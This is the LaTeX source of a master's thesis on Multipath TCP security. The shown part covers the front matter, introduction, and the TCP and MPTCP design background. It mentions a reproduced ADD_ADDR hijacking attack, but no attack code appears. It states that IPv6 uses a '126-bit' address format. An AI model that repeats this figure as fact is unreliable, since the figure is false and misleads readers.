% !TEX encoding = IsoLatin

% La riga soprastante serve per configurare gli editor TeXShop, TeXWorks
% e TeXstudio per gestire questo file con la codifica IsoLatin o Latin 1
% o ISO 8859-1.

% per commentare una riga mettere % al suo inizio
% per s-commentare una riga (ossia attivarla) togliere il % al suo inizio
%
\documentclass[pdfa% formato PDF/A, obbligatorio per l'archiviazione delle tesi di Polito
,cucitura%lascia margine per la rilegatura
%,twoside% per stampa fronte-retro (fortemente consigliato per tesi voluminose, opzionale per le altre)
%,12pt% font pi� grande (12pt) rispetto a quello normalmente usato (11pt)
]{toptesi}
%
% Commentare le righe seguenti se NON si � specificata l'opzione "pdfa"
\hypersetup{%
    pdfpagemode={UseOutlines},
    bookmarksopen,
    pdfstartview={FitH},
    colorlinks,
    linkcolor={blue},
    citecolor={red},
    urlcolor={blue}
  }
% \documentclass[11pt,twoside,oldstyle,autoretitolo,classica,greek]{toptesi}
% \usepackage[or]{teubner}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%
% Esempio di composizione di tesi di laurea.
%
% Questo esempio e' stato preparato inizialmente 13-marzo-1989
% e poi e' stato modificato via via che TOPtesi andava
% arricchendosi di altre possibilita'.
%
% Nel seguito laurea "quinquennale" sta anche per "specialistica" o "magistrale"

% Cambiare encoding a piacere; oppure non caricare nessun encoding se si usano
% solo caratteri a 7 bit (ASCII) nei file d'entrata.
%
%\usepackage[latin1]{inputenc}% IMPORTANTE! usare codifica ISO-8859-1 per le lettere accentate

\input{commands.tex}

\begin{document}
\english

\iflanguage{english}{
	\CorsoDiLaureaIn{Master of Science in\space}
	\TesiDiLaurea{Master's Degree Thesis}
	\InName{In}
	\CandidateName{Candidate}
	\AdvisorName{Supervisor}
	\NomeTutoreAziendale{Company tutors\\Intel Corporation}
}{}
\ateneo{Politecnico di Torino}

%%% scegliere la propria facolt� (solo PRIMA dell'AA 2012-2013)
%
%\facolta[III]{Ingegneria dell'Informazione}
%\facolta[IV]{Organizzazione d'Impresa\\e Ingegneria Gestionale}
%\Materia{Remote sensing}% uso sconsigliato

%\monografia{Gestione informatizzata di un magazzino ricambi}% per la laurea triennale
\titolo{Security Evaluation of Multipath TCP}% per la laurea quinquennale e il dottorato
\sottotitolo{Analyzing and fixing Multipath TCP vulnerabilities, contributing to the Linux Kernel implementation of the new version of the protocol}% NON obbligatorio, per la laurea quinquennale e il dottorato

%%% scegliere il proprio corso
%
%\corsodilaurea{Ingegneria dell'Organizzazione d'Impresa}% per la laurea di primo e secondo livello
%\corsodilaurea{Ingegneria Logistica e della Produzione}% per la laurea di primo e secondo livello
%\corsodilaurea{Ingegneria Gestionale}% per la laurea di primo e secondo livello�
\corsodilaurea{Computer Engineering}% per la laurea di primo e secondo livello
%\corsodidottorato{Meccanica}% per il dottorato

\candidato{Fabrizio \textsc{Demaria}}% per tutti i percorsi
%\secondocandidato{Evangelista \textsc{Torricelli}}% per la laurea magistrale solamente
%\direttore{prof. Albert Einstein}% per il dottorato
%\coordinatore{prof. Albert Einstein}% per il dottorato
\relatore{prof.\ Antonio Lioy}% per la laurea e il dottorato
%\secondorelatore{prof.\ Peter Sj{\"o}ld}% per la laurea magistrale
%\terzorelatore{{\tabular{@{}l}dott.\ Neil Armstrong\\prof. Maria Rossi\endtabular}}% per la laurea magistrale
%\tutore{ing.~Karl Von Braun}% per il dottorato
%\tutoreaziendale{Henrik Svensson\\Joakim Nordell\\Shujuan Chen} % solo per la laurea di secondo livello con tesi svolta in azienda
%\NomeTutoreAziendale{Supervisore aziendale\\Centro Ricerche FIAT}
%\sedutadilaurea{Agosto 1615}% per la laurea quinquennale
%\esamedidottorato{Novembre 1610}% per il dottorato
\sedutadilaurea{\textsc{March} 2016}% per la laurea triennale
%\sedutadilaurea{\textsc{Anno~accademico} 1615-1616}% per la laurea magistrale
%\annoaccademico{1615-1616}% solo con l'opzione classica
%\annoaccademico{2006-2007}% idem
%\ciclodidottorato{XV}% per il dottorato
\logosede{logopolito}
%
%\chapterbib %solo per vedere che cosa succede; e' preferibile comporre una sola bibliografia
%\AdvisorName{Supervisors}
%\newtheorem{osservazione}{Osservazione}% Standard LaTeX

%\usepackage[a-1b]{pdfx}
%\hypersetup{%
%    pdfpagemode={UseOutlines},
%    bookmarksopen,
%    pdfstartview={FitH},
%    colorlinks,
%    linkcolor={blue},
%    citecolor={green},
%    urlcolor={blue}
%  }

%
% per numerare e far comparire nell'indice anche le sezioni di quarto livello
% SCONSIGLIATO! da usarsi solo in caso di estrema necessit�
%\setcounter{secnumdepth}{4}% section-numbering-depth
%\setcounter{tocdepth}{4}% TOC-numbering-depth (TOC=Table-Of-Content)

%\setbindingcorrection{3mm}

\errorcontextlines=9

\frontespizio
\paginavuota
\newpage
%per sfruttare meglio lo spazio nella pagina
\advance\voffset -5mm
\advance\textheight 30mm

% opzionale, solo se si vuole dedicare la tesi a delle persone care
\sommario

This project is an extensive security evaluation of Multipath TCP, with a in-depth analysis of its major vulnerabilities and their fixes. Multipath TCP aims at unlocking multipath benefits globally by extending regular TCP, keeping into consideration fundamental compatibility goals in order to achieve a seamless deployment on current systems and infrastructures. 
Multipath TCP aims at achieving the ``next level'' when it comes to standard network communication and it is exciting to be part of this process. During the thesis work, patches have been developed for the Linux Kernel implementation of Multipath TCP: such patches mark the first step towards the new version of the protocol, MPTCP version 1. During the work, contributions have been also produced for the official RFC documentation for Multipath TCP, as well as contributions for related open-source projects, like the famous packet analyzer Wireshark.
Indeed, the part that I considered the most important about this work is that it gave me the possibility of positively interacting with important open-source communities, especially the Linux Kernel one. This is a big personal achievement as well as an important step for my working career that just started.
Multipath TCP is an ongoing project subjected to constant changes regarding the protocol and its implementations: this work is just a single step in the overall deployment process and I hope this will not remain my only contribution for Multipath TCP in the future.


\ringraziamenti

This thesis work has been carried out at the Intel Corporation office of Lund (Sweden), during a period of six months from September 2015 to February 2016. Before starting this project I spent one year in Stockholm, studying at KTH University as an Erasmus student originally from Torino, Italy.

The first persons I would like to thank are my family and friends from Italy, who supported me from far away during my studies in Sweden and during the whole time dedicated to this thesis. I also would like to thank the people that supported me from a closer distance, in particular the Swedish family I have lived with during the six months of the thesis project, that was very friendly to me.
I would like to thank all the people from the office, who integrated me very well despite my poor skills in speaking Swedish. 
I would like to thank my manager Henrik Svensson for giving me the possibility of working on such an valuable and interesting project. Special thanks go to the two Intel engineers that closely followed my work at the Lund office: Joakim Nordell and Shujuan Chen. 
The work involved other major stakeholders, passionate about the Multipath TCP project, who supported me in the development process: in these regards, I'd like to thank Doru Gucea, Vlad Dogaru and Octavian Purdila. 
A special thank you goes to Christoph Paasch from Apple California, who directed the whole development process from the other side of the world, helping me in the process and finally accepting my contribution to the official Multipath TCP source code for the Linux Kernel.
This work has been supported by both the Politecnico di Torino and Stockholm's KTH University and I want to thank all the professors I encountered during my academic career, especially the ones that followed this very project from the start until the final discussion: Antonio Lioy from Torino and Peter Sj�din from Stockholm.

It is impossible to mention all the enriching people that I met during my months abroad and all the inspiring experiences lived in this last phase of my academic career, but they all define the fundamental context that made this thesis work possible. 

Thank you.

\indici
\mainmatter

\chapter{Introduction}
\label{chap:introduction}

\section{Motivation}
The last few decades have seen the most pronounced technology evolution in history, in many different research areas and consumer markets: from robotics to smartphones, from medicine to cars, etc. One of the pillars upon which all these advancements have been made possible is the Internet, or more generally the entire set of networking technologies that allow software to communicate. 


The process towards interconnected devices saw a big leap forward in the early 1960s with the first research into packet switching as an alternative to the old circuit switching. But it is 1982 the year of standardization for the TCP/IP protocol suite, which permitted the expansion of interconnected networks  [wiki]. The Internet grew rapidly, passing from a few tens of million users in the 1990s to almost 3 billions users in 2014 [\href{http://www.internetlivestats.com/internet-users}{ref}]. Even more astonishing is the number of networked devices and connections globally, around 14 billion in 2014 [\href{http://www.cisco.com/c/en/us/solutions/service-provider/visual-networking-index-vni/index.html#~complete-forecast}{ref}].

\begin{figure}[!htb]
\centering
\includegraphics[width=\textwidth]{images/internet_growth}
\caption{The expansion of the Internet}
\label{fig:internet_growth}
\end{figure}

"Networks" is a very generic term. In the IT context, a computer network is set of connected nodes adopting common protocols to exchange data. The most widespread protocol for networking communication is the above-mentioned TCP/IP protocol, that is used in the vast majority of services like the World Wide Web, email, file transfer, remote system access, etc. It is also often used as a communication protocol in private networks and datacenters.
The reason for its wide adoption is not the fact that there aren't good alternatives: TCP/IP is not to most performing protocol in every network environment, but it is fairly simple and it introduces a relatively low complexity in the overall architecture, still meeting all the basic security and reliability requirements. Back in the 1980s, TCP/IP was the simpler way for applications to use most networks, and eventually it was chosen as the protocol for the Internet, thus quickly becoming a de-facto standard [\href{http://www.computerworld.com/article/2593612/networking/tcp-ip.html}{ref}]. 



During its life, the TCP/IP protocol suite have seen updates and additional components to reach the desired levels of network congestion, traffic load balancing, handling of unpredictable behaviors, security, user-experience and so on. Such aspects became more and more challenging with the uncontrollable expansion of the Internet. 
Albeit, after all these years the core components of the TCP/IP protocol design haven't changed at all, mainly for retro-compatibility reasons. This inevitably causes some aspects of the old protocol to look very limited in the current networking reality. A striking example is the scarcity of available IPv4 addresses: when TCP/IP was designed in the early stages, a 32-bit number seemed to be a very high number to encompass all the users of the network. Nevertheless, due to the unexpected increase rate in the number of Internet users (and also due to inefficient IP allocation policies), the available IPv4 addresses run out quickly, forcing the introduction of the lengthy 126-bit address format, known as IPv6, formalized in 1998. IPv6 is intended to replace IPv4, but the transition to the new format turned out to be a remarkably complicated procedure overall: IPv6 is not designed to be directly interoperable with IPv4, and even if nowadays the majority of the systems are IPv6-compatible, it took about 20 years to reach the current percentage of overall adoption: 10\% [percentage of IPv6 users accessing Google \href{http://www.google.com/intl/en/ipv6/statistics.html#tab=ipv6-adoption&tab=ipv6-adoption}{ref}]. This should give an idea of the big challenge that is modifying the core design aspects of the TCP/IP architecture; such issue is a recurrent topic in this paper.

\vspace{5mm}
When the TCP protocol was first developed in the 1970s, it was certainly difficult to predict the rate of growth of the networks all around the globe, not only in terms of the number of nodes involved, but also in terms of the quantity and type of the transmitted data, the increasing need of low latency for new streaming applications, the advancement in the hardware adopted to carry the data and the computing power of the interconnected devices. Today we can count billions of interconnected devices, and we have just started the era of the IoT (Internet of Things) which aims at giving communication capabilities to virtually every object commonly used in our daily life.
As a result of this process, the networks are becoming more complex and devices often use multiple interfaces to stay connected. Common appliances like smartphones provide both cellular connectivity and Wi-Fi modules (figure \ref{fig:smartphones}); same technologies can be often found in tablets; laptops have at least Wi-Fi capabilities plus an Ethernet port, and they support third-party receivers for connectivity through cellular networks. The argumentation is much more complex in the backend infrastructures' scenario, which is rapidly evolving due to a new interest in BigData storage and analysis, as well as the flourishing of wide-scale low-latency streaming services (video streaming, VOIP, multiplayer videogames, etc.). Datacenters often count tens of thousands of interconnected nodes, including content-delivery servers that are capable of handling a huge number of network interfaces simultaneously.

\begin{figure}[!htb]
\centering
\includegraphics[width=0.75\textwidth]{images/smartphones}
\caption{The smartphone connectivity}
\label{fig:smartphones}
\end{figure}

The implications of this new reality include the possibility of establishing multiple paths to transmit data between two applications running on the communicating hosts, since they are now often equipped with multiple network interfaces, each configured with an active IP address. Back in 1970s TCP was designed to create a virtual connection between exactly two IP addresses and two port values, with almost no flexibility or dynamism in address/port addition and/or removal within the duration of the connection. In the multipath reality of the infrastructures of today, to old point-to-point singlepath connection provided by TCP looks quite limiting. This led to various projects aiming at exploiting the multipath concept, and Multipath TCP is one of them.


Multipath TCP (MPTCP) is an ongoing project managed by the Internet Engineering Task Force (IETF), whose specifications have been published as Experimental standard in January 2013 [ref \rfc{6824}]; such protocol extends the current TCP to introduce multipathing capabilities, maintaining retro-compatibility at the end-points and undertaking a major endeavor to avoid disrupting of middleboxes' behavior. MPTPC can communicate with the application layer via standard TCP interface and it automatically splits data at the sender, it sends the data through different subflows (each being basically a regular TCP connection) according to the IP-addresses/interfaces available at the hosts and finally reassembles the data at the receiver, in fact enabling multipathing.

\subsection{Benefits of MPTCP}
Multipathing provides hosts with the resource pooling concept applied to networking access. Resource pooling allows dynamism and flexibility in requesting and handling resources and it is a positive trend in many services and architectures, like Content Delivery Networks (CDNs), Peer-to-Peer (P2P) networks, Cloud Computing, etc. The very concept of packet-switching, the core aspect of the modern Internet, is based on a resource pooling technique: circuit utilization is no more performed by allocating isolated channels in the link (static multiplexing) as it was the case with circuit switching, but the traffic is fragmented into small addressed packets that can share the overall link capacity (statistical multiplexing) [\href{https://www.cl.cam.ac.uk/~as2330/docs/multipath-survey.pdf}{ref}]. MPTCP aims at taking this concept to the next level, by grouping a set of separate links into a pool of links (figure \ref{fig:pooling}). 


\begin{figure}[!htb]
\centering
\includegraphics[width=0.75\textwidth]{images/pooling}
\caption{MPTCP pooling principle}
\label{fig:pooling}
\end{figure}


The benefits include better resource utilization, better throughput and smoother reaction to failures, leading to an overall improved user experience, as shown in the following four major use-cases:
\begin{itemize}
  \item Combining MPTCP multipath and multihoming (the connection to the Internet via multiple providers), it is possible to achieve higher throughput by exploiting multiple simultaneous connections to transfer different portions of the same piece of data. For example, a typical smartphone could use its cellular module and its Wi-Fi module simultaneously in downloading a file from a remote server, despite them having two different IP addresses;
  \item It is possible to introduce failure handover for the connection with no special mechanism at network or link layer. If one of the interfaces goes down or the flow of data gets interrupted for any reasons, data transfer can seamlessly continue through other interfaces;
  \item By assigning different priorities to the various flows, it is possible to better handle data transfer through the different interfaces; this could be useful if some connectivity modules drain more battery than others, or if any interfaces are associated to a limited-capacity data-plan. For example, consider the case of a file download on a smartphone via 4G connectivity: it would be advantageous to seamlessly switch the whole data transfer to the Wi-Fi interface if that becomes available in the middle of the download, starting from the point left by the cellular connection and without the need to restart the session;
  \item Providing multipath awareness to current network stacks can improve load balancing and exploitation of the network resources in datacenters; this is a valuable aspect, considering that the network performance in datacenters is usually critical for maintaining low latency of the overall system. A similar concept applies to load balancing in ISPs' network backbones.
\end{itemize}

\subsection{Multipathing solutions}
MPTCP aims at achieving all the benefits mentioned in the previous paragraph by operating at the transport layer of the traditional Internet architecture (figure \ref{fig:OSI}).

\begin{figure}[!htb]
\centering
\includegraphics[width=0.75\textwidth]{images/OSI}
\caption{The traditional Internet architecture}
\label{fig:OSI}
\end{figure}

Before MPTCP, other proposals have been elaborated to achieve multipath benefits by introducing new technologies at the link layer, network layer and transport layer (the latter being the layer on which TCP operates). Even at the application layer developers can create custom frameworks on top of TCP to achieve benefits similar to those that would come by exploiting multipath natively at the lower layers. For example, most modern browsers open many TCP connection simultaneously to download the various elements of a Web Page to improve user experience. Another example could be Skype and similar VOIP services, which try to automatically reconnect hosts in case of problems with minimum impact on the user experience. Albeit all the solutions at the application layer are just clever workarounds on top of regular TCP and they fall only marginally in our discussion regarding multipath.

The following list gives a general overview of the most important multipathing solutions other than MPTCP, grouped according to the architectural layer they operate in:
\begin{itemize}
  \item \textit{Link layer}: there are link aggregation techniques to combine the capacities of different interfaces to the same switch [add a ref]. There are different ways to achieve resource pooling through link aggregation, but the basic concept is to setup multiple interfaces with the same IP address (and usually the same MAC address) so that the link aggregation is transparent to the higher-level applications and then various algorithms can be used to redistribute the data packets to the various links. In order for this to work, proper configuration is needed at the host and at the next-hop switch. Despite being a common solution in ISPs' inner networks and datacenters to improve throughput and achieve higher network-access, end-users cannot directly take advantage of this technology.


  \item \textit{Network layer}: there exist multiple solutions to better exploit multipathing at this layer, most notably \textit{Mobile IP} and \textit{Shim6}. Without going into the details, they both provide hot-handover capabilities with no interruption of the higher-level services, with some limitations: Mobile IP requires extensive support by the underlying infrastructure and Shim6 is an IPv6 only solution. More importantly, there is a fundamental problem in confining resource pooling at the network layer: TCP operates at the transport layer but it is closely related to the network layer because it statefully inspects various properties of the underlying network paths to provide performance optimizations (this is why referring to TCP often implies taking into consideration the whole TCP/IP protocol stack): in most cases, transparent modifications at the network layer would cause TCP malfunctioning.


  \item \textit{Transport layer}: the most notable experiment in multipath exploitation prior to MPTCP is the Stream Control Transmission Protocol (SCTP). Such protocol is, in many ways, similar to MPTCP: the first version of SCTP provided fail-over capabilities by exploiting different interfaces, and successive versions introduced multi-streaming capabilities to increase throughput. The major problem with SCTP is that it was thought to be an alternative, enhanced version of TCP, and the two protocol are indeed incompatible with each other. This means that a wide adoption of SCTP would require to upgrade the network to be SCTP aware. Moreover, all the applications would need to be upgraded to explicitly switch to the new protocol for communication. The vast global networking scenario of today, mainly based on TCP, makes these requirements virtually impossible to meet, and SCTP remains a technology of very limited adoption.
\end{itemize}



\vspace{5mm}
All these previous solutions didn't get widespread adoption. Link layers and network layers solutions require extensive modifications in the underlying network configurations in order to achieve the desired results; introducing a new multipath-aware protocol at the transport layer requires to change all the applications in order for them to communicate over the new protocol, thus allowing this solution in very limited scenarios; workarounds at the application layer, despite being quite effective, are far from the purpose of MPTCP.


MPTCP primary goal is to automatically introduce the multipath benefits to infrastructures and devices currently adopting TCP, with the minimum possible effort from users, developers, network maintainers. Engineers decided that the best way to achieve all these requirements was to still use TCP as fundamental block for communication, extending it to support multipath: the entire protocol design works by adding MPTCP custom options into regular TCP packets and each subflow in MPTCP is indeed seen by the lower infrastructure as a regular TCP connection. 

MPTCP got a lot of attention in the Internet community in the last few years, and many consider MPTCP as a valuable step forward for the whole global network currently relying on TCP.
The final goal of MPTCP is to replace the majority of the current TCP implementations, which is a very delicate process in which all the current TCP standards in terms of robustness, performance and security have to be maintained, if not improved. This paper is an evaluation of the security aspects of MPTCP, with an analysis of current threats and vulnerabilities affecting the protocol.

\section{Problem statement}
MPTCP is a big effort from the IETF working group to unlock multipath networking capabilities worldwide, with many subtle implications for current infrastructures. Hence the importance of evaluating the current security status of MPTCP, by inspecting its implications on external middleboxes and security equipment and also by analyzing internal design flaws that might allow attacks to the MPTCP sessions. 
The reference implementation for the new protocol is available for the Linux kernel and currently maintained in an off-tree open-source repository.
The main focus of this paper is related to the main vulnerability currently known for the protocol, concerning the ADD\_ADDR component. Such vulnerability is tested and studied; the solution for it is implemented and evaluated. In the process, patches for the Linux kernel implementation of the protocol have been developed to fix the vulnerability and mark the first step to towards the new version of MPTCP. 


A comprehensive list of all the objectives for the thesis work is the following:
\begin{itemize}
    \item Studying the security implications of adopting MPTCP on current infrastructures; 
    \item Listing the known vulnerabilities affecting the current version of the protocol; 
    \item Studying and exploiting the ADD\_ADDR vulnerability of the protocol;
    \item Evaluating the possible solutions for the ADD\_ADDR vulnerability; 
    \item Assessing the best solution for the ADD\_ADDR vulnerability and developing it for the Linux kernel implementation of MPTCP;
    \item Developing effective and powerful simulation scenarios in order to test MPTCP (and possibly other networking protocols);
    \item Contributing to the upstreaming of MPTCP into the Linux kernel by developing patches and contributing to official RFC documentation.
\end{itemize}

\section{Methodology}
The thesis work has been carried out at the Intel Corporation offices in Lund (Sweden). The process took six months in total, with a main focus on testing and developing. The entire work has been closely followed by major stakeholders in the MPTCP community, located in Sweden, Romania and the United States. Such cooperation involved patch reviewing and weekly meetings.


The workflow started with an overall study of MPTCP and how it interacts with the most common middleboxes. The next step was a more focused evaluation of the current threats for the protocol, mainly referencing to the document \rfc{7430}; within the document, only one vulnerability is considered a blocking issue in the advancement of MPTCP standardization, known as the ADD\_ADDR vulnerability. The document also proposes a change in the protocol design that fixes the problem. With such background, the actual development stage of the work started. At first, it was necessary to sync with the development status by interacting with the official MPTCP mailing list for developers [\href{https://listes-2.sipr.ucl.ac.be/sympa}{ref}]; this allowed to make sure that the ADD\_ADDR solution proposed in \rfc{7430} was indeed the preferred one and that nobody started developing a patch for it already.
Before starting to work on the fix, a first stage of the work involved a deeper analysis of the ADD\_ADDR vulnerability. A connection hijacking has been executed by exploiting such vulnerability in a testing environment. This allowed to better validate the criticality of the problem and it was a useful experiment to get acquainted with MPTCP. Moreover, it was a good way to setup a proper testing environment that was indeed used during the whole patch-development process that followed.
After having reproduced the attack, it followed an analysis of the MPTCP source code within the Linux kernel in order to understand how the protocol implementation works inside the TCP stack. This step was required to get the required knowledge to start developing patches. 


The entire code developed during the stage, around 400 additions, was eventually merged into the official MPTCP repository for the Linux kernel. Some additional contributions have been performed in order to improve RFC documentation about the protocol and to upgrade related networking tools to be compatible with the new version of MPTCP.
The final evaluations and the writing of the report took place in the last two months of the working period.

\subsection{Document structure}
The structure of this paper mainly follows the workflow explained in the previous section. After the introductory first chapter, the discussion is mainly subdivided into two parts: first, an analysis about MPTCP background and working principles (chapters 2 and 3); second, a discussion about the original work on simulating and fixing the ADD\_ADDR vulnerability (chapters 4 and 5):

\begin{itemize}
  \item Chapter 2 starts with a broad explanation of the basic concepts of TCP to introduce how MPTCP has been developed on top of it. All the technical details of the new protocol can be found in this chapter. In this chapter it is also included an analysis on the MPTCP deployment status in the real world and the problematics associated in upstreaming the protocol (mainly incompatibilities with current middleboxes).
  
  \item Chapter 3 is again a background analysis on MPTCP, with a narrowed focus on its security aspects. The chapter includes a comprehensive threats analysis, with an overview of the current security issues affecting the new protocol. An entire section is dedicated to the ADD\_ADDR vulnerability. In such section all the details regarding the vulnerability are presented: how to exploit it to hijack an MPTCP connection and what are the requirements  an attacker needs to execute the attack.
  
  \item Chapter 4 is the first part that introduces the original work carried out during the thesis period. Taking as reference the theory behind the ADD\_ADDR attack explained in the previous chapter, this section explains the development of the script capable of exploiting the vulnerability in a simulated environment. The script code is explained step-by-step, as well as the entire procedure to setup the virtual machines to execute the attack. This entire chapter aims at validating the criticality of the ADD\_ADDR vulnerability and in doing so it also provide setup guidelines for a powerful simulating environment that can be useful for future MPTCP testing and development.
  
  \item Chapter 5 contains the core part of the thesis work. It starts with a theoretical evaluation of the accepted fix for the ADD\_ADDR vulnerability and goes on with its development for the Linux kernel implementation of MPTCP. All the issues encountered during the project, as well as the required side-feature that needed to be implemented for proper functioning, are reported in this chapter. The two last sections cover the remaining part of the work: the set of contributions not mentioned in the previous sections and a final evaluation of the performance of the produced patches.
  
  \item Chapter 6 is the conclusive part of the paper, where related work and proposals for future work are present, together with some final thoughts.
\end{itemize}
\chapter{Multipath TCP}
\label{chap:multipathtcp}

\section{Transmission Control Protocol (TCP)}
MPTCP is an extension of regular TCP, the ubiquitous protocol for highly reliable host-to-host communication in a packet-switched computer network. A proper introduction of the fundamentals of TCP is due.
TCP is a host-to-host communication protocol operating at a layer in between the application and the Internet Protocol. TCP abstracts all the details of the network connection to the application and it is used at the sender to split the application data stream into segments that can be efficiently routed through the network after being encapsulated into an IP packet. At the receiver, the segments are reassembled before being sent to the application layer.

The reasons why TCP became a de-facto standard in modern computer communication have been briefly mentioned in the introductory part of the paper. A more technical analysis shows that TCP maintains good levels of reliability for the connection independently from the lower layers it depends on for the raw transmission of bits. TCP is indeed able to handle possible data loss, data damaging, data duplication, out-of-order delivery of data. In order to do this, the data to be transmitted is split into a sequence of TCP segments, each containing an additional \textit{TCP header} with the information needed to operate the protocol functionalities at the nodes. Such functionalities are [\href{https://tools.ietf.org/html/rfc793}{ref}]:

\begin{itemize}
  \item \textit{Basic data transfer}: sending continuous stream of octets in each direction between its users, using the following 4-tuple to define the connection's endpoints: source IP address, source port, destination IP address, destination port. The IP address allows to route packets to the destination machine, while the port values direct the content of the packets to the right application within a host;
  \item \textit{Reliability}: in-order, reliable data transfer is achieved by adding a sequence number to each transmitted octet and using ACK signals and timeouts to possibly trigger retransmission of lost packets. TCP assures that no transmission errors will affect the delivery of the data if the network is not completely partitioned;
  \item \textit{Flow control}: the receiver can control the amount of data sent by the sender in a certain moment of the connection by returning a "window" value in the TCP header, so that it is possible to avoid buffer congestion;
  \item \textit{Multiplexing}: a single host is allowed to use multiple \textit{independent} TCP connections simultaneously thanks to the port value available in the protocol. This value, together with the host address assigned at the Internet communication layer, forms a socket, that is the actual endpoint of a TCP connection; note that \textit{multiplexing} is fundamentally different from \textit{multipathing}, the latter being the concept of exploiting multiple TCP connections for the same data transfer operation,
  \item \textit{Connections}: TCP initializes and maintains status information regarding each connection and the data stream between a pair of sockets in order to provide all its functionalities. Such data is initialized during a first handshake procedure, and released only upon connection termination. TCP is indeed known as a virtual-connection protocol;
  \item \textit{Precedence and Security}: these aspects refer to the possibility of prioritizing TCP connections and assign security properties to them. Both precedence and security can be configured by users, but default values are provided. For example, the checksumming operation for data integrity is optional in TCP.
\end{itemize}

As noted above, all TCP functionalities are made possible by processing the bits at the TCP header for each outgoing and incoming packet. The TCP header contains a structured set of fields, mostly static and predefined (with the exception of the TCP \textit{Option} field), so that at each position in the header corresponds a well known portion of the protocol data. The TCP header looks like the one in Figure \ref{fig:tcp_header}.

\begin{figure}[!htb]
\centering
\includegraphics[width=0.8\textwidth]{images/tcp_header}
\caption{The TCP header format}
\label{fig:tcp_header}
\end{figure}

A component of the TCP header that is fundamental for MPTCP is the \textit{Options} field, which was introduced as a free space for future additions for the protocol. In this specific case, the TLV solution is adopted to process the data inside the field. "TLV" stands for \textit{type-length-value}, where the \textit{type} is the ID value uniquely identifying the option, the \textit{length} is the number of bytes of the option, whereas the \textit{value} represents the actual option content. This particular design allows to skip unknown options at the receiver (if type ID is not recognized) by simply checking the length value and moving the pointer accordingly. An important limitation for this field is that its total length cannot be more than 40 bytes [ref].

Regarding the basic operation of regular TCP, a connection is divided into three steps: \textit{connection establishment}, \textit{data transfer} and \textit{connection release}. Different fields in the TCP header are used for the different phases of the connection.

\subsubsection{Connection enstablishment}

During the connection establishment, a  three-way handshake is performed between the client and the server: the client sends a SYN packet to the port on which the server is listening; after that, the server answers with a SYN/ACK packet to acknowledge the connection request; as a third and final step, the client acknowledge the SYN/ACK packet by sending to the server an ACK packet. The three phases of this procedure justify the name "three-way handshake". In order to define the kind of TCP segment received, single-bit fields in the TCP header are used (for example, SYN and ACK flags are shown in figure \ref{fig:tcp_header}). 
The three-way handshake is important for various reasons: first of of all, both hosts declare their willingness to open the TCP connection using the addresses and ports indicated in the packets: the \textit{Source Port} and \textit{Destination Port}, together with the source and destination IP addresses provided in the IP header (not shown in figure \ref{fig:tcp_header}), are the means for identifying the two endpoints of the TCP connection. These fixed fields clearly shows the single-path fundamental design of TCP. 
Moreover, during the initial handshake both client and server declare the supported \textit{Options} and agree on the initial \textit{Sequence Number} values to be used for both directions of the connection.

\begin{figure}[!htb]
\centering
\includegraphics[width=0.75\textwidth]{images/tcphandshake}
\caption{Basic TCP three-way handshake procedure}
\label{fig:tcphandshake}
\end{figure}

\subsubsection{Data transfer}
TCP splits the payload into multiple packets that are independently routed in the network and it is possible that they arrive at destination unordered, or that some of them are lost on the way. TCP is a protocol that offers bidirectional communication, so that the the receiver can communicate to the sender information for data transfer control. \textit{Sequence Number} and \textit{Acknowledgment Number} in the TCP header are used to number each transferred octet in the payload, so that the receiver can reorder them and acknowledge them in a cumulative way: by acknowledging sequence number X to the sender, the receiver is signaling that all packets up to but not including X have been received. This system, together with timeouts and sliding window mechanisms, allows for retransmission of lost packets, too. There is a flag bit in the header that is used to determine if a TCP segment is an ACK segment (also used during the initial handshake), meaning that the \textit{Acknowledgment Number} field in the current packet indeed represents the next \textit{Sequence Number} that the receiver is expecting. 
The \textit{Window} field is used to indicate to the sender the range of sequence numbers that the receiver is prepared to accept in a particular moment of the connection. In this way, the receiver can tune the the data flow and slow it down if the application is slow at consuming data and buffers tend to fill up quickly. The \textit{Checksum} field guarantees that data has not been modified on its way to the destination, intentionally or unintentionally.

\subsubsection{Connection release}
In normal cases, each participant terminates its end of the TCP connection by using a specific bit available in the TCP header: the FIN bit. The FIN message is indeed a way for a host to signal the request for connection termination, but such request has to be sent and acknowledged with a ACK for both endpoints before reaching the final tear down. Connection termination differs from the three-way handshake mechanism used for for connection establishment, and it can be better described as a pair of two-way handshakes between client and server.
There are also cases in which something goes wrong in the middle of the connection, compromising the correct functioning of the TCP protocol for data transfer; in these cases, the RST flag is used in a message to force abrupt closure of the connection.
 
\begin{figure}[!htb]
\centering
\includegraphics[width=0.75\textwidth]{images/tcpclosure}
\caption{Normal TCP connection termination procedure}
\label{fig:tcpclosure}
\end{figure}

\section{MPTCP design}
\label{mptcpdesign}
MPTCP \textit{functional goals} are to increase resilience of the connectivity and efficiency of the resource usage by exploiting multiple paths (subflows) for the connection.
Similar goals can be found in other multipathing solutions as the ones described in section \ref{mptcp_alternatives}, but what is really unique about MPTCP design is the set of its \textit{compatibilities goals} [\href{https://tools.ietf.org/html/rfc6182}{ref}]:

\begin{itemize}
  \item \textit{Application compatibility} aims at instantiating a protocol that can be fully operational with no modifications for the applications using it. This means that the networking APIs and the overall service model of regular TCP have to be maintained with MPTCP; the entire MPTCP functioning is handled transparently by the underlying system. Such transparency must be maintained also in terms of throughput, resilience and security for the connection, that cannot be deteriorated with respect to the current TCP standards;
  \item \textit{Network compatibility} is a goal similar to the previous one, since MPTCP is supposed to work seamlessly with the current underlying network layer and the ones below it. The main reason still resides in the possibility of achieving a smooth wide deployment of the protocol on current infrastructure;
  \item \textit{Users compatibility} is a corollary to both network and application compatibility, which states that MPTCP flows must be fair to regular TCP connection in case of shard bottlenecks. If MPTCP would adopt a congestion control that is the same of the one for regular TCP, each subflow in an MPTCP connection would get the same amount of resources as a regular TCP connection and the overall bandwidth distribution would be unfair. Specific MPTCP congestion-control schemes have been studied to avoid such problems [refs].
\end{itemize}

All these compatibility requirements should justify the very fundamental decision of developing the new multipath protocol at the transport layer of the OSI architecture. Let's take into consideration the traditional TCP protocol stack and compare it to the new MPTCP stack (figure \ref{fig:stack}).
